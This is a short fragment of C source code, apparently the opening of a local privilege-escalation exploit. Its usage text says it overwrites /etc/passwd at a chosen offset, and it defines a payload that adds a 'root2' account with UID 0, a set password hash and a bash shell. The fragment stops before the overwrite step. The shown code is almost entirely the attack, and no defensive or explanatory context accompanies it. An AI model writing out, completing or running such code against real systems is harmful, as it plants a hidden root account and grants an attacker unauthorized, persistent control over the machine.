int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s offset\n", argv[0]);
        fprintf(stderr, "Overwrite /etc/passwd at given offset with root2 entry\n");
        return 1;
    }

    off_t offset = atoll(argv[1]);

    // New root2 user entry payload
    const char *payload = "root2:U6aMy0wojraho:0:0::/root:/bin/bash\n";

